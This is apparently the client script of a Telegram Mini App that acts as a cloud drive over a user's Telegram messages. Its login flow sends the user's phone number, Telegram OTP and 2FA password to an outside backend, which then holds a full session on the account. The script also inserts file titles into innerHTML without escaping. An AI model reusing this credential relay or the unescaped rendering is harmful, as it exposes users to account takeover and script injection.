const tg = window.Telegram.WebApp;
tg.expand();
tg.ready();

let currentCategory = 'all'; 
let cloudTotalCounts = {};

// 🔴 သင့် Render URL အမှန်ဖြင့် အစားထိုးပါ
const BACKEND_URL = "https://telegramcloudbackend.onrender.com";

let phoneHash = "", userPhone = "", pollingInterval, allFilesData = [];
let tgUser = tg.initDataUnsafe?.user;

let userName = tgUser && tgUser.id ? tgUser.id.toString() : (localStorage.getItem("temp_uid") || "Web_Cloud_User_" + Math.floor(Math.random() * 1000000));

function switchStep(stepId) {
    document.querySelectorAll(".step").forEach(el => el.classList.add("hidden"));
    let target = document.getElementById(stepId);
    if(target) target.classList.remove("hidden");
}

function setLoadingText(text) { document.getElementById("loading-text").innerText = text; }

function setDisplayUsername() {
    let brandEl = document.getElementById("sidebar-brand-name");
    if(!brandEl) return;
    let displayName = "Telegram Cloud"; 
    if (tgUser) {
        if (tgUser.username) displayName = "@" + tgUser.username;
        else if (tgUser.first_name || tgUser.last_name) displayName = ((tgUser.first_name || "") + " " + (tgUser.last_name || "")).trim();
    } else if (userName && !userName.startsWith("Web_Cloud_User_")) {
        displayName = "ID: " + userName; 
    }
    brandEl.innerHTML = `<i class="fa-brands fa-telegram text-blue"></i> ${displayName}`;
}

window.onload = async () => {
    switchStep("step-loading");
    let cached = localStorage.getItem(`cloudData_${userName}`);
    let cachedCounts = localStorage.getItem(`cloudCounts_${userName}`);
    if (cachedCounts) { try { cloudTotalCounts = JSON.parse(cachedCounts); } catch(e) {} }
    
    if (cached) {
        try {
            allFilesData = JSON.parse(cached);
            updateCategoryStatus();
            renderFilesGrid(allFilesData);
        } catch(e) {}
    }
    
    try {
        let res = await fetch(`${BACKEND_URL}/api/check_session`, {
            method: "POST", headers: {"Content-Type": "application/json"},
            body: JSON.stringify({ name: userName })
        });
        let result = await res.json();
        if(result.exists) { switchStep("step-success"); fetchCloudData(); } 
        else { switchStep("step-phone"); }
    } catch(e) { switchStep("step-phone"); }
};

function toggleManualLogin() {
    let area = document.getElementById("desktop-input-area");
    area.classList.toggle("hidden-fold");
    area.classList.toggle("show-fold");
}

function handleMobileContact() {
    if (!tg.requestContact) return; 
    tg.requestContact(function(shared) {
        if (shared) {
            let userId = tg.initDataUnsafe?.user?.id;
            if (!userId) return showAlert("User ID ဖတ်မရပါ။", "Error");
            
            setLoadingText("Requesting OTP...");
            switchStep("step-loading");
            pollingInterval = setInterval(() => checkContactReceived(userId), 2000);
            
            // 💡 Server Sleep မှ ပြန်နိုးရန် အချိန်ပေးထားပါသည်
            setTimeout(() => {
                if(pollingInterval) {
                    clearInterval(pollingInterval);
                    showAlert("ချိတ်ဆက်မှု ကြန့်ကြာနေပါသည်။ Server ပြန်နိုးနေပါပြီ၊ ထပ်မံကြိုးစားကြည့်ပါ။", "Timeout");
                    switchStep("step-phone");
                }
            }, 90000);
        }
    });
}

async function handleDesktopContact() {
    let phone = document.getElementById("manual_phone").value.trim();
    if (!phone) return showAlert("ဖုန်းနံပါတ် ရိုက်ထည့်ပါ။", "Notice");
    if (phone.startsWith("09")) phone = "+95" + phone.substring(1);
    else if (!phone.startsWith("+")) phone = "+" + phone;
    userPhone = phone;
    setLoadingText("Sending code...");
    switchStep("step-loading");
    try {
        let res = await fetch(`${BACKEND_URL}/api/send_code`, { method: "POST", headers: {"Content-Type": "application/json"}, body: JSON.stringify({ phone: userPhone }) });
        let result = await res.json();
        if (result.success) { phoneHash = result.hash; switchStep("step-otp"); } 
        else { showAlert(result.message, "Error"); switchStep("step-phone"); }
    } catch (e) { showAlert("Connection Failed. Server ပြန်နိုးနေပါပြီ၊ ခဏနေပြန်နှိပ်ပါ။", "Error"); switchStep("step-phone"); }
}

async function checkContactReceived(userId) {
    try {
        let res = await fetch(`${BACKEND_URL}/api/check_contact`, { method: "POST", headers: {"Content-Type": "application/json"}, body: JSON.stringify({ user_id: userId }) });
        let result = await res.json();
        if (result.success) {
            clearInterval(pollingInterval); pollingInterval = null;
            userPhone = result.phone; phoneHash = result.hash;
            switchStep("step-otp"); tg.HapticFeedback.impactOccurred("medium");
        } else if (result.message) { 
            clearInterval(pollingInterval); pollingInterval = null;
            showAlert(result.message, "Error"); switchStep("step-phone");
        }
    } catch(e) {}
}

async function verifyOTP() {
    let code = document.getElementById("otp_input").value;
    if(code.length !== 5) return showAlert("OTP ၅ လုံး ပြည့်အောင် ရိုက်ပါ။", "Notice");
    setLoadingText("Verifying...");
    switchStep("step-loading");
    try {
        let res = await fetch(`${BACKEND_URL}/api/verify_code`, { method: "POST", headers: {"Content-Type": "application/json"}, body: JSON.stringify({ phone: userPhone, code: code, hash: phoneHash, name: userName }) });
        let result = await res.json();
        if(result.success) {
            if(result.real_user_id) {
                userName = result.real_user_id;
                localStorage.setItem("temp_uid", userName);
                setDisplayUsername();
            }
            switchStep("step-success"); tg.HapticFeedback.notificationOccurred("success"); fetchCloudData(); 
        } else if (result.message === "2FA_REQUIRED") { switchStep("step-2fa"); } 
        else { showAlert(result.message, "Error"); switchStep("step-otp"); }
    } catch(e) { showAlert("Verification Failed.", "Error"); switchStep("step-otp"); }
}

async function verify2FA() {
    let password = document.getElementById("password_input").value;
    if(!password) return showAlert("Password ရိုက်ထည့်ပါ။", "Notice");
    setLoadingText("Unlocking...");
    switchStep("step-loading");
    try {
        let res = await fetch(`${BACKEND_URL}/api/verify_code`, { method: "POST", headers: {"Content-Type": "application/json"}, body: JSON.stringify({ phone: userPhone, code: document.getElementById("otp_input").value, hash: phoneHash, name: userName, password: password }) });
        let result = await res.json();
        if(result.success) {
            if(result.real_user_id) {
                userName = result.real_user_id;
                localStorage.setItem("temp_uid", userName);
                setDisplayUsername();
            }
            switchStep("step-success"); tg.HapticFeedback.notificationOccurred("success"); fetchCloudData();
        } else { showAlert("Password မှားယွင်းနေပါသည်။", "Error"); switchStep("step-2fa"); }
    } catch(e) { showAlert("Verification Failed.", "Error"); switchStep("step-2fa"); }
}

let currentOffset = 0; 

async function fetchCloudData(isLoadMore = false) {
    let statusText = document.getElementById("cloud-status");
    let grid = document.getElementById("cloud-files-grid");
    let loadMoreBtn = document.getElementById("btn-load-more");
    let loadMoreContainer = document.getElementById("load-more-container");
    
    if (!isLoadMore) {
        currentOffset = 0; 
        statusText.innerText = "Syncing with Telegram Cloud...";
        grid.innerHTML = "<div class='flex-center' style='grid-column: 1 / -1;'><div class='modern-spinner'></div></div>";
        if (loadMoreContainer) loadMoreContainer.classList.add("hidden");
    } else {
        if (loadMoreBtn) { loadMoreBtn.innerHTML = "<i class='fa-solid fa-spinner fa-spin mr-2'></i> Loading..."; loadMoreBtn.disabled = true; }
    }
    
    try {
        let res = await fetch(`${BACKEND_URL}/api/get_cloud_data`, {
            method: "POST", headers: {"Content-Type": "application/json"}, body: JSON.stringify({ name: userName, offset_id: currentOffset })
        });
        let result = await res.json();
        
        if(result.success) {
            if (isLoadMore) allFilesData = allFilesData.concat(result.files);
            else allFilesData = result.files;

            if (result.total_counts) {
                cloudTotalCounts = result.total_counts;
                localStorage.setItem(`cloudCounts_${userName}`, JSON.stringify(cloudTotalCounts));
            }

            localStorage.setItem(`cloudData_${userName}`, JSON.stringify(allFilesData));
            
            updateCategoryStatus();
            updateStorageUI(); 
            renderFilesGrid(currentCategory === 'all' ? allFilesData : allFilesData.filter(f => f.type === currentCategory));

            if (result.files.length > 0 && result.next_offset) {
                currentOffset = result.next_offset;
                if (result.files.length === 50) { if (loadMoreContainer) loadMoreContainer.classList.remove("hidden"); } 
                else { if (loadMoreContainer) loadMoreContainer.classList.add("hidden"); }
            } else {
                if (loadMoreContainer) loadMoreContainer.classList.add("hidden");
            }
        } else {
            if (result.session_expired) {
                tg.HapticFeedback.notificationOccurred("error");
                showAlert("အကောင့်ဟောင်း (သို့) လုံခြုံရေးအရ ပိတ်လိုက်ပါပြီ။ ပြန်လည် Login ဝင်ပေးပါ။", "Session Expired", () => {
                    localStorage.removeItem(`cloudData_${userName}`);
                    window.location.reload();
                }); 
            } else {
                if (!isLoadMore) statusText.innerText = "Sync failed.";
                else showToast("Failed to load more files.", "error");
            }
        }
    } catch(e) { 
        if (!isLoadMore) statusText.innerText = "Connection error."; 
        else showToast("Connection error.", "error");
    }

    if (isLoadMore && loadMoreBtn) {
        loadMoreBtn.innerHTML = "<i class='fa-solid fa-cloud-arrow-down mr-2'></i> Load More"; loadMoreBtn.disabled = false;
    }
}

function loadMoreFiles() { fetchCloudData(true); }

function renderFilesGrid(files) {
    let html = "";
    if(files.length === 0) {
        html = "<div class='flex-center' style='grid-column: 1 / -1; color: var(--text-muted);'><i class='fa-brands fa-telegram mb-2' style='font-size:40px;'></i><p>Your drive is empty.</p></div>";
    } else {
        files.forEach(f => {
            try {
                let iconClass = "fa-file-lines doc";
                if (f.type === "photo") iconClass = "fa-image photo";
                else if (f.type === "video") iconClass = "fa-film video";
                else if (f.type === "link") iconClass = "fa-link link";
                else if (f.type === "text") iconClass = "fa-note-sticky text";
                
                let thumbHtml = "";
                if (f.thumb_file_id) {
                    thumbHtml = `<img src="${BACKEND_URL}/api/thumb/${f.thumb_file_id}" class="fc-thumb" loading="lazy" onerror="this.outerHTML='<i class=\\'fa-solid ${iconClass} fc-icon\\'></i>'">`;
                } else {
                    thumbHtml = `<i class="fa-solid ${iconClass} fc-icon"></i>`;
                }

                let safeTitle = f.title ? f.title.replace(/'/g, "\\'").replace(/"/g, "&quot;") : "Unknown File";
                let displayTitle = f.title ? f.title : "Unknown File";
                
                let dateStr = "";
                if (f.timestamp) {
                    let d = new Date(f.timestamp * 1000);
                    let months = ["Jan","Feb","Mar","Apr","May","Jun","Jul","Aug","Sep","Oct","Nov","Dec"];
                    let hours = d.getHours();
                    let minutes = d.getMinutes().toString().padStart(2, '0');
                    dateStr = `${d.getDate()} ${months[d.getMonth()]}, ${hours}:${minutes}`;
                }

                html += `
                <div class="file-card" onclick="openFile('${f.id}')">
                    ${thumbHtml}
                    <div class="fc-title">${displayTitle}</div>
                    <div class="fc-meta">${f.size || dateStr}</div>
                </div>`;
            } catch (err) {}
        });
    }
    document.getElementById("cloud-files-grid").innerHTML = html;
}

function filterFiles(type, element) {
    currentCategory = type;
    document.querySelectorAll('.nav-links li, .nav-item').forEach(el => el.classList.remove('active'));
    if(element) element.classList.add('active');
    
    let titles = { 'all': 'My Drive', 'photo': 'Photos', 'video': 'Videos', 'doc': 'Documents', 'link': 'Links', 'text': 'Notes' };
    document.getElementById('current-category').innerText = titles[type];
    
    updateCategoryStatus();
    renderFilesGrid(type === 'all' ? allFilesData : allFilesData.filter(f => f.type === currentCategory));
}

function updateCategoryStatus() {
    let statusText = document.getElementById("cloud-status");
    let filtered = currentCategory === 'all' ? allFilesData : allFilesData.filter(f => f.type === currentCategory);
    let currentLoaded = filtered.length;
    let total = cloudTotalCounts[currentCategory] !== undefined ? cloudTotalCounts[currentCategory] : currentLoaded;
    
    if (total === 0 && currentLoaded === 0) statusText.innerText = "0 items";
    else statusText.innerText = `${currentLoaded} items synced | total ${total} items`;
}

function searchFiles(query) {
    let lowerQ = query.toLowerCase();
    renderFilesGrid(allFilesData.filter(f => f.title.toLowerCase().includes(lowerQ)));
}

async function saveCloudNote() {
    let noteInput = document.getElementById("note_input");
    let text = noteInput.value.trim();
    if(!text) return;
    let btn = event.target.closest('button');
    btn.innerHTML = "<i class='fa-solid fa-spinner fa-spin'></i>"; btn.disabled = true;
    try {
        await fetch(`${BACKEND_URL}/api/upload_note`, {
            method: "POST", headers: {"Content-Type": "application/json"}, body: JSON.stringify({ name: userName, text: text })
        });
        noteInput.value = ""; tg.HapticFeedback.notificationOccurred("success"); fetchCloudData(); 
    } catch(e) { showToast("Failed to save note.", "error"); }
    btn.innerHTML = "<i class='fa-solid fa-paper-plane'></i>"; btn.disabled = false;
}

function showToast(message, type = "normal") {
    let existing = document.querySelector(".toast");
    if(existing) existing.remove(); 
    let toast = document.createElement("div");
    toast.className = `toast ${type}`;
    toast.innerHTML = message;
    document.body.appendChild(toast);
    setTimeout(() => {
        toast.style.animation = "fadeOut 0.3s forwards";
        setTimeout(() => toast.remove(), 300);
    }, 3000);
}

async function openFile(msgId) {
    tg.HapticFeedback.impactOccurred("medium");
    showToast("<i class='fa-solid fa-spinner fa-spin mr-2'></i> Sending to chat...", "normal");
    try {
        let res = await fetch(`${BACKEND_URL}/api/view_file`, {
            method: "POST", headers: {"Content-Type": "application/json"},
            body: JSON.stringify({ name: userName, msg_id: msgId })
        });
        let result = await res.json();
        
        if(result.success) {
            tg.HapticFeedback.notificationOccurred("success");
            showToast("<i class='fa-solid fa-check mr-2'></i> Ready! Swipe down app to view.", "success");
        } else {
            // 💡 Error 2 Fix: ပို့မရပါက Telegram ရဲ့ တကယ့် Error ကို UI မှာ ပြပေးပါမည်
            if (result.message && result.message.includes("Session Terminated")) {
                showAlert(result.message, "Logged Out", () => window.location.reload());
            } else {
                showToast("<i class='fa-solid fa-xmark mr-2'></i> " + (result.message || "Failed to send."), "error");
            }
        }
    } catch(e) { showToast("Connection error.", "error"); }
}

async function openSettings() {
    tg.HapticFeedback.impactOccurred("light");
    document.getElementById("settings-modal").classList.remove("hidden");
    try {
        let res = await fetch(`${BACKEND_URL}/api/get_recovery_key`, {
            method: "POST", headers: {"Content-Type": "application/json"}, body: JSON.stringify({ name: userName })
        });
        let result = await res.json();
        if(result.success) document.getElementById("recovery_key_display").innerText = result.key;
    } catch(e) { document.getElementById("recovery_key_display").innerText = "Error loading key"; }
}

function closeSettings() { document.getElementById("settings-modal").classList.add("hidden"); }

async function restoreCloud() {
    let keyInput = document.getElementById("restore_key_input").value.trim();
    if(!keyInput) return showAlert("Please enter a Recovery Key.", "Notice");
    
    let btn = event.target.closest('button');
    btn.innerHTML = "<i class='fa-solid fa-spinner fa-spin mr-2'></i> Restoring Data..."; btn.disabled = true;
    try {
        let res = await fetch(`${BACKEND_URL}/api/restore_cloud`, {
            method: "POST", headers: {"Content-Type": "application/json"}, body: JSON.stringify({ name: userName, key: keyInput })
        });
        let result = await res.json();
        if(result.success) {
            closeSettings();
            showToast(`<i class='fa-solid fa-check mr-2'></i> Successfully restored ${result.count} files!`, "success");
            fetchCloudData(); 
        } else {
            showAlert(result.message || "Invalid Key.", "Error");
        }
    } catch(e) { showAlert("Restore Failed.", "Error"); }
    btn.innerHTML = "<i class='fa-solid fa-rotate-left mr-2'></i> Restore Now"; btn.disabled = false;
}

let alertCloseCallback = null;

function showAlert(message, title = "Notice", callback = null) {
    alertCloseCallback = callback;
    document.getElementById("custom-alert-title").innerText = title;
    document.getElementById("custom-alert-message").innerText = message;
    
    let overlay = document.getElementById("custom-alert-overlay");
    overlay.classList.remove("hidden");
    setTimeout(() => { overlay.classList.add("show"); }, 10);
    if(tg.HapticFeedback) tg.HapticFeedback.notificationOccurred("warning");
}

function closeCustomAlert() {
    let overlay = document.getElementById("custom-alert-overlay");
    overlay.classList.remove("show");
    setTimeout(() => {
        overlay.classList.add("hidden");
        if (alertCloseCallback) {
            let cb = alertCloseCallback;
            alertCloseCallback = null;
            cb();
        }
    }, 300);
}

async function loginWithKey() {
    let keyInput = document.getElementById("access_key_input").value.trim();
    if(!keyInput) return showAlert("Please enter your Access Key.", "Notice");
    
    setLoadingText("Verifying Key...");
    switchStep("step-loading");
    
    try {
        let res = await fetch(`${BACKEND_URL}/api/login_with_key`, {
            method: "POST", headers: {"Content-Type": "application/json"}, body: JSON.stringify({ key: keyInput })
        });
        let result = await res.json();
        
        if(result.success) {
            userName = result.name;
            localStorage.setItem("temp_uid", userName);
            setDisplayUsername(); 
            switchStep("step-success");
            if(tg.HapticFeedback) tg.HapticFeedback.notificationOccurred("success");
            fetchCloudData(); 
        } else {
            showAlert(result.message, "Login Failed");
            switchStep("step-key-login");
        }
    } catch(e) {
        showAlert("Connection Failed. Please check your internet.", "Error");
        switchStep("step-key-login");
    }
}

function copyRecoveryKey() {
    let keyText = document.getElementById("recovery_key_display").innerText;
    if (keyText && keyText !== "Loading..." && keyText !== "Error loading key") {
        const showSuccess = () => {
            showToast("<i class='fa-solid fa-check mr-2'></i> Key Copied to Clipboard!", "success");
            if(tg.HapticFeedback) tg.HapticFeedback.notificationOccurred("success");
        };
        const fallbackCopy = () => {
            let textArea = document.createElement("textarea");
            textArea.value = keyText;
            textArea.setAttribute('readonly', '');
            textArea.style.position = "fixed"; 
            textArea.style.left = "-99999px";
            textArea.style.top = "-99999px";
            document.body.appendChild(textArea);
            textArea.focus();
            textArea.select();
            try {
                if (document.execCommand('copy')) showSuccess();
                else showAlert("Failed to copy. Please copy it manually.", "Error");
            } catch (err) { showAlert("Failed to copy.", "Error"); }
            document.body.removeChild(textArea);
        };
        if (navigator.clipboard && window.isSecureContext) {
            navigator.clipboard.writeText(keyText).then(showSuccess).catch(err => fallbackCopy());
        } else fallbackCopy();
    }
}

function updateStorageUI() {
    let totalMB = 0;
    if (allFilesData && allFilesData.length > 0) {
        allFilesData.forEach(f => {
            if(f.size && typeof f.size === "string") {
                let num = parseFloat(f.size.replace(/[^\d.-]/g, ''));
                if(!isNaN(num)) totalMB += (f.size.includes("GB") ? (num * 1024) : num);
            }
        });
    }
    let displaySize = "0.0 MB";
    if (totalMB > 0) displaySize = (totalMB >= 1024) ? ((totalMB / 1024).toFixed(2) + " GB") : (totalMB.toFixed(1) + " MB");
    
    let storageString = `${displaySize} of Unlimited used`;
    let sidebarText = document.getElementById("sidebar-storage-text");
    if (sidebarText) sidebarText.innerText = storageString;
    let settingsText = document.getElementById("settings-storage-text");
    if (settingsText) settingsText.innerText = storageString;

    let visualPercent = Math.max(3, Math.min((totalMB / 1048576) * 100, 85));
    document.querySelectorAll('.progress-fill').forEach(el => el.style.width = visualPercent + '%');
}

// 🔒 လုံခြုံရေး အဆင့် (၃) - Real-time Session Killer (၅ စက္ကန့် တစ်ခါ အသက်ဝင်နေမလား စစ်ဆေးမည်)
setInterval(async () => {
    let successStep = document.getElementById("step-success");
    
    // Cloud မျက်နှာပြင်ကို ရောက်နေမှသာ Background ကနေ စစ်ဆေးမည်
    if (successStep && !successStep.classList.contains("hidden")) {
        try {
            let res = await fetch(`${BACKEND_URL}/api/check_session`, {
                method: "POST", headers: {"Content-Type": "application/json"},
                body: JSON.stringify({ name: userName })
            });
            let result = await res.json();
            
            // 🚨 Admin က Session ဖြတ်လိုက်တာနဲ့ ချက်ချင်း Data တွေဖျက်ပြီး Login Screen ကို ကန်ထုတ်မည်
            if (result && !result.exists) {
                // Device ထဲမှာ ကျန်နေတဲ့ Cache Data တွေ အားလုံးကို ရှင်းထုတ်မည်
                localStorage.removeItem(`cloudData_${userName}`);
                localStorage.removeItem(`cloudCounts_${userName}`);
                localStorage.removeItem("temp_uid");
                
                // Alert ပြပြီး App ကို Reload လုပ်ကာ Login မျက်နှာပြင်သို့ ပို့မည်
                tg.HapticFeedback.notificationOccurred("error");
                showAlert("လုံခြုံရေးအရ အကောင့်ပိတ်သွားပါသည်။ ပြန်လည် Login ဝင်ပေးပါ။", "Session Terminated", () => {
                    window.location.reload(); 
                });
            }
        } catch(e) {
            // Network Error ဖြစ်ပါက ကျော်သွားမည်
        }
    }
}, 5000); // ၅ စက္ကန့် တစ်ခါ (60000ms) တိတိကျကျ စစ်ဆေးမည်
